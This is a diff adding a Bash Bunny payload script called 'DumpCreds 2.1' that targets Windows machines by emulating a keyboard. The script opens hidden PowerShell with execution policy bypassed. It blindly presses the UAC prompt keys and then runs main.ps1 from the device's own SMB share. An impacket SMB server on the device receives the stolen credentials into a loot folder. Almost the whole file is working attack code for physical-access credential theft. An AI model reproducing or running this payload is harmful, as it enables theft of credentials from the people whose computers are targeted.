@@ -1,0 +1,154 @@
+﻿#!/bin/bash
+#
+# Title:         DumpCreds 2.1
+# Author:        QDBA
+# Version:       2.1.0
+# Build: 		 1004
+# Category:      Exfiltration
+# Target:        Windows Windows 7 + 10 (Powershell)
+# Attackmodes:   HID, Ethernet 
+# !!! works only with Bash Bunny FW 1.1 and up !!!
+# 
+# 
+# LED                      Status                                       
+# ----------------------- + -------------------------------------------- 
+# SETUP                   + Setup                                        
+# FAIL                    + No /tools/impacket/examples/smbserver.py found
+# FAIL2                   + Target did not acquire IP address            
+# Yellow single blink     + Initialization                               
+# Yellow double blink     + HID Stage                                    
+# Yellow triple blink     + Wait for IP coming up                        
+# Cyan inv single blink   + Wait for Handshake (SMBServer Coming up)     
+# Cyan inv quint blink    + Powershell scripts running                   
+# White fast blink        + Cleanup, copy Files to <root>/loot           
+# Green              	  + Finished                                     
+# ----------------------- + -------------------------------------------- 
+
+
+LED SETUP
+
+# Some functions
+
+function cleanup() {
+	rm $LOOTDIR/
+	rmdir $LOOTDIR
+	rm -f $SWITCHDIR/CON_EOF
+	sync; sleep 1; sync
+}
+
+# Some Variables
+SWITCHDIR=/root/udisk/payloads/$SWITCH_POSITION
+LOOTDIR=$SWITCHDIR/loot
+mkdir -p $LOOTDIR >/dev/null
+
+
+requiretool impacket/examples/smbserver.py
+
+# remove old Handshake Files
+rm -f $SWITCHDIR/CON_*
+
+
+# HID STAGE
+# Runs minimized powershell waiting for Bash Bunny to appear as 172.16.64.1.
+
+ATTACKMODE HID
+
+export DUCKY_LANG=de
+
+# Give some time for driver installation
+Q DELAY 25000
+
+LED STAGE1
+# Launch initial cmd
+
+RUN WIN cmd /k mode con lines=1 cols=100
+
+
+
+# Launch powershell as admin and deletes Run history
+Q DELAY 1000
+Q STRING start powershell -NoP -NonI -W Hidden -Exec Bypass -c "Start-Process cmd -A '/k mode con lines=1 cols=100' -Verb runAs"
+Q DELAY 500
+Q ENTER
+
+
+# Bypass UAC :: Change "ALT j" and "ALT n" according to your language i.e. for us it is ALT o  (OK) and ALT c (cancel)
+ 
+# With Admin rights the UAC prompt opens. ALT j goes to the prompt and the admin CMD windows opens. The ALT n goes to this Window (doesn't matter) than Enter for Newline
+# now the second powershell command goes to the admin cmd windows. 
+
+# With no Adminrights the the credentils prompt opens. ALT j doesn't do anything because there are no credentials. Then ALT n cancels the credentials propmpt. 
+# the second powershell command goes to the cmd Windows I open first. 
+Q DELAY 1000
+Q ALT j
+Q DELAY 500
+Q ENTER
+
+Q DELAY 1000
+Q ALT n
+Q DELAY 500
+Q ENTER
+
+LED STAGE2
+# Wait for Bunny Ethernet and Start main.ps1 Powershell Script
+Q DELAY 500
+#Q STRING "powershell \"while (1) { If (Test-Connection 172.16.64.1 -count 1 -quiet) { sleep 2; powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File \\\172.16.64.1\e\main.ps1; exit } }\""
+Q STRING "powershell \"while (1) { If (Test-Connection 172.16.64.1 -count 1 -quiet) { sleep 2; powershell -ExecutionPolicy Bypass -File \\\172.16.64.1\e\main.ps1; exit } }\""
+
+Q DELAY 1000
+Q ENTER
+
+
+
+# Ethernet Tage
+LED SPECIAL1
+ATTACKMODE RNDIS_ETHERNET
+# Source bunny_helpers.sh to get environment variables
+
+
+
+# Start SMB Server
+/tools/impacket/examples/smbserver.py e $SWITCHDIR &
+
+# Give target a chance to start exfiltration
+sleep 2
+
+# Here you can do anything else except but do not change the ATTACKMODE or umount /root/udisk
+
+
+
+# Check target IP address. If unset, blink slow red.
+#if [ -z "${TARGET_IP}" ]; then
+#   LED FAIL2
+#	ATTACKMODE RNDIS_ETHERNET STORAGE
+#	exit 1
+#fi
+
+LED SPECIAL2
+# Handshake Bunny and Computer
+while ! [ -f $SWITCHDIR/CON_REQ ]; do
+	sleep 1
+done
+mv $SWITCHDIR/CON_REQ $SWITCHDIR/CON_OK
+
+
+# Wait until CON_EOF - Computer set it if all is ready
+while ! [ -f $SWITCHDIR/CON_EOF ]; do
+	LED Y
+	sleep 1
+	LED M
+	sleep 1
+done
+
+LED Cleanup
+	# Cleanup
+	if ! [ -d /root/udisk/loot/DumpCred_2.1 ]; then
+		mkdir -p /root/udisk/loot/DumpCred_2.1
+	fi
+	mv -f $LOOTDIR/* /root/udisk/loot/DumpCred_2.1 
+	cleanup
+
+
+ATTACKMODE RNDIS_ETHERNET STORAGE
+LED FINISH
+
